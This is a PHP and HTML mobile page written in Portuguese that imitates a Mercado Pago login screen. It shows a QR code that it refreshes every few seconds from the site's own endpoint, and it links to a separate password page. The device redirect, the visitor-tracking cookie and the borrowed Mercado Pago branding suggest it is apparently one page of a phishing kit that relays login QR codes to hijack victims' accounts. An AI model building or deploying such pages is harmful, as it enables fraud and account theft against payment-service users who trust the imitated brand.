<?php
// --- VERIFICAÇÃO DE DISPOSITIVO E SESSÃO ---

// Se o acesso NÃO for de um dispositivo móvel, redireciona para a versão desktop.
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$isMobile = preg_match('/(Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone)/i', $userAgent);

if (!$isMobile) {
    header('Location: telaqr.php'); // Altere para o nome da sua página desktop
    exit;
}

// Inicia a sessão e valida o cookie de identificação
session_start();
if (!isset($_COOKIE['identificador_cliente'])) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escaneie o QR para iniciar sessão</title>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul: #3483fa;
            --cor-texto-primaria: #333;
            --cor-texto-secundaria: #666;
            --cor-fundo: #f5f5f5;
            --cor-card: #ffffff;
        }
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: var(--cor-fundo);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .main-header {
            background-color: var(--cor-amarela);
            padding: 12px 24px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
        }
        .main-header img {
            height: 35px;
        }
        .main-content {
            padding: 32px 24px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center; /* Centraliza os itens horizontalmente */
            text-align: center;
        }
        .session-start-label {
            font-size: 12px;
            font-weight: 600;
            color: var(--cor-texto-secundaria);
            text-transform: uppercase;
            margin-bottom: 8px;
        }
        .main-title {
            font-size: 24px;
            font-weight: 500;
            color: var(--cor-texto-primaria);
            margin: 0 0 16px 0;
            line-height: 1.3;
        }
        .description-text {
            font-size: 16px;
            color: var(--cor-texto-secundaria);
            line-height: 1.5;
            max-width: 320px; /* Evita que o texto fique muito largo */
            margin-bottom: 32px;
        }
        .qr-card {
            background-color: var(--cor-card);
            border-radius: 6px;
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            padding: 24px;
            width: 100%;
            max-width: 280px; /* Largura máxima do card */
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .qr-image {
            width: 100%; /* Imagem ocupa toda a largura do card */
            height: auto;
            margin-bottom: 24px;
        }
        .other-method-link {
            color: var(--cor-azul);
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }
        .other-method-link:hover {
            text-decoration: underline;
        }
        .main-content .other-method-link {
            margin-top: 32px;
        }
    </style>
</head>
<body>
    <header class="main-header">
        <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.50/mercadopago/logo__small.png" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <span class="session-start-label">INÍCIO DE SESSÃO</span>
        <h1 class="main-title">Escaneie o QR para iniciar sessão de forma segura</h1>
        <p class="description-text">Este passo é necessário para validar sua identidade e manter sua conta sempre protegida.</p>

        <div class="qr-card">
            <img src="2.png" alt="Código QR para login" id="qr-image" class="qr-image">
            <a href="senha-mobile.php" class="other-method-link">Escolher outro método</a>
        </div>

    </main>

    <script>
        // A MESMA FUNCIONALIDADE JAVASCRIPT DA VERSÃO DESKTOP
        const qrImage = document.getElementById('qr-image');

        async function verificarQrCode() {
            try {
                // Esta API busca um novo QR code no servidor
                const response = await fetch('api_get_qrcode.php');
                const data = await response.json();

                if (data.success && data.qrcode_path) {
                    console.log('Novo QR Code recebido:', data.qrcode_path);
                    
                    // Atualiza a imagem, adicionando um timestamp para evitar cache do navegador
                    qrImage.src = data.qrcode_path + '?t=' + new Date().getTime();
                }
            } catch (error) {
                console.error('Erro ao buscar QR Code:', error);
            }
        }

        // Inicia a verificação a cada 3 segundos
        setInterval(verificarQrCode, 3000);
    </script>
</body>
</html>